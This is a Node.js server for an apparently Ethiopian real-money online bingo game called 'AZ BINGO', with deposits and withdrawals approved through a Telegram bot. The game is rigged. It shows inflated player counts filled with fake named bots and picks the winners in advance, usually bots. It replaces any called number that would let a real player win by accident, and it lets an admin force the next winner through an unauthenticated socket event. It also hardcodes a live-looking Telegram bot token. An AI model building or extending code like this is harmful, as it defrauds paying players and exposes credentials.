const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.express = express;
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";

// 🎁 ለአዲስ ተመዝጋቢዎች የአንድ ጊዜ ቦነስ የወሰዱትን ዩዘሮች ለመያዝ
const claimedWelcomeBonusUsers = new Set();
const userWallets = {}; 

// 🔄 ዋናዎቹ ቁጥሮች በቅደም ተከተል ሉፕ እያደረጉ የሚወጡበት አሰላለፍ
const customNumberFlowSequence = [
    18, 18, 19, 23, 22, 27, 19, 17, 22, 30, 12, 19, 25, 24, 22, 18, 19, 23, 22, 15, 16, 18, 19, 22, 22, 23, 27, 28, 18, 18, 19, 24, 24, 19, 15, 14, 18, 15, 16, 25, 22, 19, 19, 30, 19, 16, 12, 23, 17, 26, 23, 19, 18, 22, 16, 19, 22, 18, 27, 30, 21, 21, 19
];
let sequenceIndex = 0;

// 🌟 አልፎ አልፎ (Rare) የሚወጡ ልዩ የ RAR ቁጥሮች ፖል
const rareRotationPool = [10, 11, 33, 34, 36];

const ETHIOPIAN_BOT_NAMES = [
    "Henok", "Dani", "Simret Getachew", "Anwar", "Naughty By nature",
    "Ñãtåñ......", "kali", "Mohammedsani Sulitan", "Wubamlak Belste", "Lina Habtamu",
    "Nimo", "Šà¥¢ø Qü€€ñ", "Beki", "syf", "Time Of",
    "§mrĕţ", "L F U", "sosi", "Megdi", "Sittina",
    "Ibra", "Abebaw", "Frew", "Quarezma", "Dibora",
    "Osmhen", "Chala", "Surafel", "Zehara", "Worku",
    "Fiyorina", "Kirra", "Bilal", "Pilatos", "Merlin",
    "Osmehin", "Denver", "Belew", "Jilalu", "Gizachew Kassahun",
    "bereket dagne", "Mesfin", "ሞለፍን ኔትስት ገበየሁ", "Birukte#🦋", "🦋Meklit🦋",
    "Abel x", "Farhewot Yashtla", "🅖ⓞⓞⓓ🌹", "YO", "እያሱ",
    "Goyta Miraw ጣምራው", "0919091129", "Gdg", "Lai", "Sintayehu Getachew",
    "Pipo Kassa", "ገብርኤል አባቴ", "Yohannes Ng", "Gech man", "Devido ✝",
    "Seydou Kamite", "Mamush Kasim Mucaa Kakuuuu", "Aman yi", "Ahmed Basher",
    "Wenda last King", "Abonesh Kinfu", "Lij yalfex jinka 🫅", "Big Boss 💪", "Firde Nigus",
    "ANIE X YUKKI", "Girum Edeshawu", "Bini Teketele", "Abdella Mohammed Ebrahim", "Asbada Abubakar",
    "Ebrahim M/d Ebrahim", "Abdu Shekna", "Abdujalil Ahmed Detolale", "urjii 🥷", "Amoo",
    "Assistant 2", "Anu 28", "ማኅበል", "Yd", "Girmay Nigus",
    "Yohannes", "H 5", "አበነህ 💕💕💕", "Tolosa", "Kejelcha Mamo",
    "Ashagre", "Ed", "Gedefaw Aseffa", "D 7", "Getachew",
    "Tamirat Girma", "Ashenafi", "Dada", "Demsash", "ድር ድር",
    "አፒው", "Ahadi Ahemed", "skat mamaniyø", "tamirat", "kasu",
    "PPP✌️🔥😋69", "Ad la", "Astu Bast", "getesh aresenal", "WALEX JOSEF",
    "Habet", "♠[$]♠", "Ratum yasın", "ˋHEER X MUSICˎ", "Alemayehu Tesema",
    "habtu moges", "‖꧁Tame꧂‖", "Alexs Kebede", "Dagna King", "Haileyesus Geremew",
    "Chicken Road", "nal", "Wase", "Y@imam", "Current thing",
    "Wizzy", "weyn Ter", "Tedi", "Tame 😍", "Fenaan Fenaan Barbaadi",
    "Fire Tesfaye", "Samii", "Tesfaye Asnake", "Teg 0920", "Mitiku57 Kibatu",
    "yohannes online", "Melkamnew", "L14", "Terryson Cruzman", "Teddy",
    "kefle birhane", "Abushi 💀💀", "Yonase Tesema", "Mulugeta Fantahun", "Kifle Møk",
    "Pro max", "Nscros", "የማርያም", "አቤል", "Tloya",
    "ተሜ", "bakle", "ናቲና", "Dj", "wanaw",
    "Falcon", "Dawit_B", "Ermias_99", "Solomon_K", "Bethel_M",
    "Miki_Bingo", "Hanna_T", "Natnael_X", "Kidist_L", "Bereket_P",
    "Samson_G", "Yordanos_K", "Feven_A", "Henok_Z", "Meron_W",
    "Rediet_S", "Abel_T", "Tsion_M", "Brook_H", "Lidya_D",
    "Michael_B", "Nahom_V", "Rut_K", "Robel_M", "Tigist_Y",
    "Biniyam_C", "Kalkidan_F", "Ephrem_G", "Rahel_N", "Yonas_P", "Semhar_L"
];

function getRandomBotNames(count) {
    let shuffled = [...ETHIOPIAN_BOT_NAMES].sort(() => 0.5 - Math.random());
    return shuffled.slice(0, count);
}

let globalRoom = {
    gameActive: false,
    calledNumbers: [],
    gameStartTime: Date.now() + 60000,
    playersCount: 140,
    takenCards: [],
    playerRoundCards: {},
    playerTemporaryCards: {},
    lastCalledNumber: null,
    targetWinCallCount: 25,
    forcedWinningCardNums: []
};

let forcedNextWinner = null; 
let onlineRealUsers = [];
let pendingRequests = {};
let offlineApprovedQueue = {}; 
let gameInterval = null;
let numberCallInterval = null;

function getCartelaNumbers(cardNum) {
    let cardNumbersByCol = { B: [], I: [], N: [], G: [], O: [] };
    let colRanges = { B: [1, 15], I: [16, 30], N: [31, 45], G: [46, 60], O: [61, 75] };
    let cols = ['B', 'I', 'N', 'G', 'O'];

    cols.forEach((col, colIdx) => {
        let range = colRanges[col];
        let pool = [];
        for (let n = range[0]; n <= range[1]; n++) pool.push(n);

        let seed = (cardNum * 7919) + (colIdx * 104729);
        for (let i = pool.length - 1; i > 0; i--) {
            seed = (seed * 9301 + 49297) % 233280;
            let rnd = seed / 233280;
            let j = Math.floor(rnd * (i + 1));
            let temp = pool[i]; pool[i] = pool[j]; pool[j] = temp;
        }
        cardNumbersByCol[col] = pool.slice(0, 5);
    });

    let flatList = [];
    for (let r = 0; r < 5; r++) {
        cols.forEach(col => {
            if (r === 2 && col === 'N') flatList.push("FREE");
            else flatList.push(cardNumbersByCol[col][r]);
        });
    }
    return flatList;
}

function getWinningMatchedIndices(winningCardNumbers, calledNumbers) {
    let grid2D = [];
    let cleanCalled = (calledNumbers || []).map(n => Number(n));
    
    for(let r=0; r<5; r++) {
        let row = [];
        for(let c=0; c<5; c++) {
            let idx = r * 5 + c;
            let val = winningCardNumbers[idx];
            let isHit = (val === "FREE" || cleanCalled.includes(Number(val)));
            row.push({ idx, isHit, val });
        }
        grid2D.push(row);
    }

    for(let r=0; r<5; r++) {
        if(grid2D[r].every(cell => cell.isHit)) {
            return grid2D[r].map(cell => cell.idx);
        }
    }

    for(let c=0; c<5; c++) {
        let colHits = true;
        let colCells = [];
        for(let r=0; r<5; r++) {
            colCells.push(grid2D[r][c]);
            if(!grid2D[r][c].isHit) colHits = false;
        }
        if(colHits) {
            return colCells.map(cell => cell.idx);
        }
    }

    let diag1Hits = true, diag2Hits = true;
    let diag1Cells = [], diag2Cells = [];
    for(let i=0; i<5; i++) {
        diag1Cells.push(grid2D[i][i]);
        diag2Cells.push(grid2D[i][4-i]);
        if(!grid2D[i][i].isHit) diag1Hits = false;
        if(!grid2D[i][4-i].isHit) diag2Hits = false;
    }
    if(diag1Hits) return diag1Cells.map(cell => cell.idx);
    if(diag2Hits) return diag2Cells.map(cell => cell.idx);

    if(grid2D[0][0].isHit && grid2D[0][4].isHit && grid2D[4][0].isHit && grid2D[4][4].isHit) {
        return [0, 4, 20, 24];
    }

    let fallbackMatched = [];
    grid2D.forEach(row => {
        row.forEach(cell => {
            if (cell.isHit) fallbackMatched.push(cell.idx);
        });
    });
    return fallbackMatched;
}

// 🕒 የኢትዮጵያ ሰዓት አቆጣጠር ሎጂክ (Base Count) እንደነበረው ሆኖ...
function getRealisticBotsCount(realCount) {
    const now = new Date();
    let utcHours = now.getUTCHours();
    let utcMinutes = now.getUTCMinutes();
    let ethiopianHour = (utcHours + 3) % 24; 
    let totalMinutesFrom16 = ((ethiopianHour - 16 + 24) % 24) * 60 + utcMinutes;
    let maxDurationMinutes = 8 * 60;
    let calculated = 95;

    if (ethiopianHour >= 6 && ethiopianHour < 12) {
        calculated = 45 + Math.floor(Math.random() * 15);
    } else if (ethiopianHour >= 12 && ethiopianHour < 19) {
        calculated = 70 + Math.floor(Math.random() * 20);
    } else {
        let progress = Math.min(1, Math.max(0, totalMinutesFrom16 / maxDurationMinutes));
        calculated = Math.floor(100 + (progress * 130) + (Math.sin(Date.now() / 3000) * 15));
    }

    // 🔀 ከአንድ ጌም ወደ ቀጣይ ጌም ሲሸጋገር ከ 1 እስከ 5 ያሉ ሰዎች በዘፈቀደ እንዲቀነሱ ወይም እንዲጨምሩ (Fluctuation between 1 and 5)
    let randomDelta = Math.floor(Math.random() * 5) + 1; // 1 እስከ 5
    let sign = Math.random() < 0.5 ? 1 : -1; // ፕላስ ወይም ማይነስ
    let finalCount = calculated + (randomDelta * sign);

    if (finalCount < 40) finalCount = 40;
    if (finalCount > 250) finalCount = 250;
    return finalCount;
}

function refreshTakenCardsList() {
    let allTaken = [];
    Object.values(globalRoom.playerRoundCards).forEach(p => {
        if (p.cards) allTaken.push(...p.cards);
    });
    Object.values(globalRoom.playerTemporaryCards).forEach(cards => {
        if (cards) allTaken.push(...cards);
    });
    globalRoom.takenCards = Array.from(new Set(allTaken));
    io.emit('updateTakenCards', globalRoom.takenCards);
}

function simulateBotCardSelections() {
    if (globalRoom.gameActive) return;
    let available = [];
    for(let i = 1; i <= 500; i++) {
        if(!globalRoom.takenCards.includes(i)) available.push(i);
    }
    let botPicksCount = Math.floor(Math.random() * 15) + 10;
    for(let i = 0; i < botPicksCount && available.length > 0; i++) {
        let randIdx = Math.floor(Math.random() * available.length);
        let cardToTake = available.splice(randIdx, 1)[0];
        if(!globalRoom.takenCards.includes(cardToTake)) {
            globalRoom.takenCards.push(cardToTake);
        }
    }
    io.emit('updateTakenCards', globalRoom.takenCards);
}

setInterval(simulateBotCardSelections, 6000);

async function sendWinnerNotificationToAdmin(winnerNamesStr, cardNum, prizePerWinner, isRealUser) {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID || !isRealUser) return;
    let message = `🏆 *AZ BINGO - 👤 አሸናፊ(ዎች)*\n\n🎉 አሸናፊዎች: *${winnerNamesStr}*\n🔢 ዋና ካርድ ቁጥር: \`#${cardNum}\`\n💰 የተሸለመው የድርሻ ብር (ለእያንዳንዱ): *${prizePerWinner} ብር*\n👥 ተጫዋቾች ብዛት: ${globalRoom.playersCount}`;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown'
        });
    } catch (error) {}
}

function startMainGameLoop() {
    if (gameInterval) clearInterval(gameInterval);
    globalRoom.gameStartTime = Date.now() + 60000;

    gameInterval = setInterval(() => {
        let timeLeft = globalRoom.gameStartTime - Date.now();

        if (timeLeft <= 0 && !globalRoom.gameActive) {
            globalRoom.gameActive = true;
            globalRoom.calledNumbers = [];
            globalRoom.lastCalledNumber = null;
            
            // 🔄 ጌሙ ሲጀምር የተጫዋቾች ቁጥር በየጌሙ ከ 1 እስከ 5 በዘፈቀደ እንዲቀየር ወይም እንዲጨምር ማዘመን
            let realCount = connectedRealPlayers.length;
            globalRoom.playersCount = getRealisticBotsCount(realCount) + realCount;
            io.emit('updatePlayersCount', globalRoom.playersCount);

            let activeRealEntries = Object.entries(globalRoom.playerRoundCards).filter(([socketId, data]) => data.cards && data.cards.length > 0);
            let currentWinnerType = forcedNextWinner;
            forcedNextWinner = null; 

            let winningUsernamesArr = [];
            let winningSocketData = []; 
            let winnersCount = 1; 
            let winningCardNums = [];

            let targetRealCount = 0;
            let targetBotCount = 1;

            let explicitRealForced = (currentWinnerType === 'random_real' || currentWinnerType === 'random_3_real' || currentWinnerType === 'multi_real_3' || currentWinnerType === 'real_user' || currentWinnerType === 'single_real');

            if (explicitRealForced && activeRealEntries.length > 0) {
                if (currentWinnerType.includes('3')) {
                    targetRealCount = Math.min(3, activeRealEntries.length);
                    winnersCount = targetRealCount;
                } else {
                    targetRealCount = 1;
                    winnersCount = 2;
                }
                targetBotCount = winnersCount - targetRealCount;
                if (targetBotCount < 0) targetBotCount = 0;
            } else {
                targetRealCount = 0;
                winnersCount = Math.random() < 0.5 ? 1 : 2;
                targetBotCount = winnersCount;
            }

            if (targetRealCount > 0 && activeRealEntries.length > 0) {
                let shuffledReal = [...activeRealEntries].sort(() => 0.5 - Math.random());
                let chosenReal = shuffledReal.slice(0, targetRealCount);
                chosenReal.forEach(item => {
                    winningUsernamesArr.push(item[1].username);
                    winningSocketData.push({ socketId: item[0], isBot: false });
                    winningCardNums.push(item[1].cards && item[1].cards.length > 0 ? item[1].cards[0] : Math.floor(Math.random() * 450) + 1);
                });
            }

            while (winningUsernamesArr.length < winnersCount) {
                let bName = getRandomBotNames(1)[0];
                winningUsernamesArr.push(bName);
                winningSocketData.push({ socketId: null, isBot: true });
                winningCardNums.push(Math.floor(Math.random() * 450) + 1);
            }

            winnersCount = winningUsernamesArr.length;
            globalRoom.forcedWinningCardNums = winningCardNums;
            
            // 🔄 ዋናዎቹ ቁጥሮች በቅደም ተከተል ሉፕ እያደረጉ ይወጣሉ
            let targetCallCount = customNumberFlowSequence[sequenceIndex];
            sequenceIndex = (sequenceIndex + 1) % customNumberFlowSequence.length;

            // 🌟 አልፎ አልፎ (Rare) ከብዙ ጌም አንዴ የ rareRotationPool ቁጥሮች እንዲተኩ ይደረጋል
            if (Math.random() < 0.15) { 
                targetCallCount = rareRotationPool[Math.floor(Math.random() * rareRotationPool.length)];
            }

            let possiblePatterns = [
                [0,1,2,3,4], [5,6,7,8,9], [10,11,12,13,14], [15,16,17,18,19], [20,21,22,23,24],
                [0,5,10,15,20], [1,6,11,16,21], [2,7,12,17,22], [3,8,13,18,23], [4,9,14,19,24],
                [0,6,12,18,24], [4,8,12,16,20],
                [0,4,20,24]
            ];

            let perWinnerConfigs = winningCardNums.map(cNum => {
                let cList = getCartelaNumbers(cNum);
                let p = possiblePatterns[Math.floor(Math.random() * possiblePatterns.length)];
                let reqNums = p.map(idx => cList[idx]).filter(n => n !== "FREE");
                return { cardNum: cNum, cartelaList: cList, patternIndices: p, requiredNumbers: reqNums };
            });

            let interleavedWinningNumbers = [];
            let maxLength = Math.max(...perWinnerConfigs.map(cfg => cfg.requiredNumbers.length));
            
            for (let i = 0; i < maxLength; i++) {
                perWinnerConfigs.forEach(cfg => {
                    if (cfg.requiredNumbers[i] !== undefined && !interleavedWinningNumbers.includes(cfg.requiredNumbers[i])) {
                        interleavedWinningNumbers.push(cfg.requiredNumbers[i]);
                    }
                });
            }

            if (interleavedWinningNumbers.length > targetCallCount) {
                interleavedWinningNumbers = interleavedWinningNumbers.slice(0, targetCallCount);
            }

            let availableNumbers = Array.from({length: 75}, (_, i) => i + 1);
            
            io.emit('gameStarted', { calledNumbers: [] });
            io.emit('gameStartedBroadcast');

            if (numberCallInterval) clearInterval(numberCallInterval);
            
            let winNumQueue = [...interleavedWinningNumbers];

            numberCallInterval = setInterval(() => {
                if (!globalRoom.gameActive) {
                    if (numberCallInterval) { clearInterval(numberCallInterval); numberCallInterval = null; }
                    return;
                }

                let reachedTargetLimit = (globalRoom.calledNumbers.length >= targetCallCount);
                
                let realUserCompleted = false;
                if (targetRealCount > 0) {
                    perWinnerConfigs.forEach((cfg, idx) => {
                        let matchedIdxs = getWinningMatchedIndices(cfg.cartelaList, globalRoom.calledNumbers);
                        let isPatternDone = cfg.patternIndices.every(pIdx => matchedIdxs.includes(pIdx));
                        if (!winningSocketData[idx].isBot && isPatternDone) {
                            realUserCompleted = true;
                        }
                    });
                }
                
                let shouldTriggerWin = (reachedTargetLimit || (targetRealCount > 0 && realUserCompleted) || (targetRealCount === 0 && reachedTargetLimit));
                
                if (shouldTriggerWin) {
                    let totalPot = (globalRoom.playersCount || 140) * 10;
                    let prizePerWinner = Math.floor(((totalPot * 0.90) / winnersCount));

                    let primaryCardNum = winningCardNums[0];
                    let winningCardNumbers = getCartelaNumbers(primaryCardNum);
                    let matchedIndices = getWinningMatchedIndices(winningCardNumbers, globalRoom.calledNumbers);

                    let winnerNamesStr = winningUsernamesArr.join(', ');
                    let hasRealWinner = winningSocketData.some(i => !i.isBot);
                    
                    sendWinnerNotificationToAdmin(winnerNamesStr, primaryCardNum, prizePerWinner, hasRealWinner);

                    winningSocketData.forEach(item => {
                        if (!item.isBot && item.socketId) {
                            let targetSocket = io.sockets.sockets.get(item.socketId);
                            if (targetSocket) {
                                targetSocket.emit('rewardPrize', { prize: prizePerWinner });
                            }
                        }
                    });

                    io.emit('bingoWinner', {
                        username: winnerNamesStr,
                        userId: winningSocketData.find(i => !i.isBot)?.socketId || null,
                        cardNum: primaryCardNum,
                        prize: prizePerWinner,
                        calledNumbers: globalRoom.calledNumbers,
                        matchedIndices: matchedIndices,
                        winnersCount: winnersCount,
                        playersCount: globalRoom.playersCount
                    });

                    if (numberCallInterval) { clearInterval(numberCallInterval); numberCallInterval = null; }
                    
                    setTimeout(() => { endRoundAndRestart(); }, 6000);
                    return;
                }

                let calledNum;
                if (winNumQueue.length > 0) {
                    calledNum = Number(winNumQueue.shift());
                    let availIdx = availableNumbers.indexOf(calledNum);
                    if (availIdx > -1) availableNumbers.splice(availIdx, 1);
                } else {
                    let randIdx = Math.floor(Math.random() * availableNumbers.length);
                    calledNum = availableNumbers.splice(randIdx, 1)[0];
                }

                if (calledNum !== undefined && !globalRoom.calledNumbers.includes(Number(calledNum))) {
                    if (targetRealCount === 0) {
                        let activeRealEntriesCheck = Object.values(globalRoom.playerRoundCards);
                        let isAccidentalRealWin = false;
                        
                        activeRealEntriesCheck.forEach(playerData => {
                            if (playerData.cards) {
                                playerData.cards.forEach(cNum => {
                                    let cList = getCartelaNumbers(cNum);
                                    let tempCalled = [...globalRoom.calledNumbers, Number(calledNum)];
                                    let matched = getWinningMatchedIndices(cList, tempCalled);
                                    
                                    let possiblePatterns = [
                                        [0,1,2,3,4], [5,6,7,8,9], [10,11,12,13,14], [15,16,17,18,19], [20,21,22,23,24],
                                        [0,5,10,15,20], [1,6,11,16,21], [2,7,12,17,22], [3,8,13,18,23], [4,9,14,19,24],
                                        [0,6,12,18,24], [4,8,12,16,20], [0,4,20,24]
                                    ];
                                    
                                    possiblePatterns.forEach(pat => {
                                        if (pat.every(pIdx => matched.includes(pIdx))) {
                                            isAccidentalRealWin = true;
                                        }
                                    });
                                });
                            }
                        });

                        if (isAccidentalRealWin && availableNumbers.length > 0) {
                            let alternativeRandIdx = Math.floor(Math.random() * availableNumbers.length);
                            calledNum = availableNumbers.splice(alternativeRandIdx, 1)[0];
                        }
                    }

                    globalRoom.calledNumbers.push(Number(calledNum));
                    globalRoom.lastCalledNumber = Number(calledNum);

                    io.emit('numberCalled', {
                        number: Number(calledNum),
                        calledNumbers: globalRoom.calledNumbers
                    });
                    io.emit('numberCalledBroadcast', Number(calledNum));
                }

            }, 4000); 
        }
    }, 1000);
}

function endRoundAndRestart() {
    if (numberCallInterval) { clearInterval(numberCallInterval); numberCallInterval = null; }
    globalRoom.gameActive = false;
    globalRoom.calledNumbers = [];
    globalRoom.lastCalledNumber = null;
    globalRoom.playerRoundCards = {}; 
    globalRoom.gameStartTime = Date.now() + 60000;
    globalRoom.forcedWinningCardNums = [];
    
    io.emit('roundEnded', { nextGameIn: 60000 });
    io.emit('gameEndedBroadcast');
    refreshTakenCardsList();
}

startMainGameLoop();

let telegramOffset = 0;
async function pollTelegramUpdates() {
    if (!TELEGRAM_BOT_TOKEN) return;
    try {
        let response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
            params: { offset: telegramOffset, timeout: 30 }
        });
        if (response.data && response.data.ok) {
            let updates = response.data.result;
            for (let update of updates) {
                telegramOffset = update.update_id + 1;
                
                let nowTs = Date.now();
                Object.keys(pendingRequests).forEach(k => {
                    if (nowTs - pendingRequests[k].timestamp > 86400000) {
                        delete pendingRequests[k];
                    }
                });

                if (update.callback_query) {
                    let callbackQuery = update.callback_query;
                    let data = callbackQuery.data; 
                    let chatId = callbackQuery.message.chat.id;
                    let messageId = callbackQuery.message.message_id;
                    
                    let parts = data.split('_');
                    let action = parts[0]; 
                    let requestId = parts.slice(1).join('_');
                    let reqData = pendingRequests[requestId];

                    if (reqData) {
                        let targetSocket = io.sockets.sockets.get(reqData.socketId);
                        let reqType = String(reqData.type || 'deposit').toLowerCase().trim();
                        let rawAmount = Number(reqData.amount) || 0;
                        let finalAmountForClient = (reqType === 'withdraw' || reqType === 'withdrawal') ? -Math.abs(rawAmount) : Math.abs(rawAmount);

                        if (action === 'app') {
                            if (targetSocket) {
                                targetSocket.emit('financialApproved', { 
                                    type: reqData.type, 
                                    amount: rawAmount, 
                                    adjustedAmount: finalAmountForClient 
                                });
                            } else {
                                if (!offlineApprovedQueue[reqData.userId]) {
                                    offlineApprovedQueue[reqData.userId] = [];
                                }
                                offlineApprovedQueue[reqData.userId].push({
                                    type: reqData.type,
                                    amount: rawAmount,
                                    adjustedAmount: finalAmountForClient
                                });
                            }

                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `✅ *ጥያቄው ጸድቋል!* (${reqData.amount} ብር - ${reqData.username})`, parse_mode: 'Markdown'
                            }).catch(() => {});
                        } else {
                            if (targetSocket) { 
                                targetSocket.emit('financialRejected', { type: reqData.type, amount: rawAmount }); 
                            }
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `❌ *ጥያቄው ተሰርዟል!* (${reqData.amount} ብር - ${reqData.username})`, parse_mode: 'Markdown'
                            }).catch(() => {});
                        }
                        delete pendingRequests[requestId]; 
                    }
                    try { 
                        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: callbackQuery.id }); 
                    } catch (e) {}
                }
            }
        }
    } catch (err) {}
    setTimeout(pollTelegramUpdates, 1000);
}
setTimeout(pollTelegramUpdates, 2000);

async function sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt) {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) return;
    let reqTypeTitle = type === 'deposit' ? '💳 ቴሌብር ዲፖዚት' : '🏧 ቴሌብር ዊዝድሮዋል';
    let message = `🔔 *AZ BINGO - ${reqTypeTitle}*\n\n👤 ስም: *${username || 'ተጫዋች'}*\n🆔 ዩዘር ID: \`${userId}\`\n💰 ቀሪ ሂሳብ: *${currentBalance} ብር*\n📥 የጠየቀው: *${amount} ብር*\n📱 ስልክ: ${phone || 'አልተሰጠም'}`;
    if (receipt) message += `\n\n📄 *ደረሰኝ / SMS:*\n\`${receipt}\``;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown',
            reply_markup: { 
                inline_keyboard: [
                    [
                        { text: "✅ አጽድቅ", callback_data: "app_" + requestId }, 
                        { text: "❌ ሰርዝ", callback_data: "rej_" + requestId }
                    ]
                ] 
            }
        });
    } catch (error) {}
}

let connectedRealPlayers = [];

io.on('connection', (socket) => {
    connectedRealPlayers.push(socket.id);
    let realCount = connectedRealPlayers.length;
    let currentBotsCount = getRealisticBotsCount(realCount);
    globalRoom.playersCount = currentBotsCount + realCount; 
    io.emit('updatePlayersCount', globalRoom.playersCount);
    socket.emit('syncGameState', globalRoom);
    refreshTakenCardsList();

    socket.on('registerRealUser', (userData) => {
        if (userData && userData.userId) {
            let userId = String(userData.userId);
            onlineRealUsers = onlineRealUsers.filter(u => u.userId !== userId);
            onlineRealUsers.push({ socketId: socket.id, userId: userId, username: userData.username || 'No Username', fullName: userData.fullName || 'ተጫዋች' });
            
            // 🎁 ለአዲስ ተመዝጋቢዎች የአንድ ጊዜ የ20 ብር ቦነስ አሰራር
            if (!claimedWelcomeBonusUsers.has(userId)) {
                claimedWelcomeBonusUsers.add(userId);
                socket.emit('welcomeBonusGranted', { 
                    amount: 20, 
                    message: "እንኳን ደህና መጡ! የመጀመሪያ የአንድ ጊዜ የ20 ብር ቦነስ ተሰጥቷል!" 
                });
            }

            if (offlineApprovedQueue[userId] && offlineApprovedQueue[userId].length > 0) {
                offlineApprovedQueue[userId].forEach(item => {
                    socket.emit('financialApproved', item);
                });
                delete offlineApprovedQueue[userId];
            }
        }
    });

    socket.on('getAdminRealUsers', () => {
        socket.emit('adminRealUsersListUpdate', onlineRealUsers);
    });

    socket.on('tempSelectCards', (cards) => {
        if (Array.isArray(cards)) {
            globalRoom.playerTemporaryCards[socket.id] = cards;
            refreshTakenCardsList();
        }
    });

    socket.on('confirmCards', (data) => {
        if (data && data.cards && Array.isArray(data.cards)) {
            globalRoom.playerRoundCards[socket.id] = {
                cards: data.cards,
                username: data.username || 'ተጫዋች',
                userId: data.userId || 'unknown'
            };
            if (globalRoom.playerTemporaryCards[socket.id]) {
                delete globalRoom.playerTemporaryCards[socket.id];
            }
            refreshTakenCardsList();
            socket.emit('cardSelectionSuccess');
        }
    });

    socket.on('adminSetNextWinner', (data) => {
        forcedNextWinner = data.winnerType ? String(data.winnerType).trim() : null;
        socket.emit('adminWinnerResponse', { success: true, message: `✅ ቀጣዩ አሸናፊ ተስተካክሏል` });
    });

    socket.on('financialRequest', async (data) => {
        data.type = data.type || 'deposit';
        let { type, amount, username, userId, currentBalance, phone, receipt } = data;
        
        let requestId = 'req_' + socket.id.substring(0, 5) + '_' + Math.floor(Math.random() * 1000000) + '_' + Date.now();
        
        pendingRequests[requestId] = { 
            userId: String(userId || 'unknown'), 
            type, 
            amount, 
            username, 
            socketId: socket.id, 
            timestamp: Date.now() 
        };

        await sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt);
        socket.emit('requestSubmitted', { success: true, message: "✅ ጥያቄዎ ለአድሚን ተልኳል!" });
    });

    socket.on('disconnect', () => {
        connectedRealPlayers = connectedRealPlayers.filter(id => id !== socket.id);
        onlineRealUsers = onlineRealUsers.filter(u => u.socketId !== socket.id);
        delete globalRoom.playerRoundCards[socket.id];
        delete globalRoom.playerTemporaryCards[socket.id];
        refreshTakenCardsList();
        let realCount = connectedRealPlayers.length;
        globalRoom.playersCount = getRealisticBotsCount(realCount) + realCount;
        io.emit('updatePlayersCount', globalRoom.playersCount);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log("AZ Server running on port " + PORT);
});
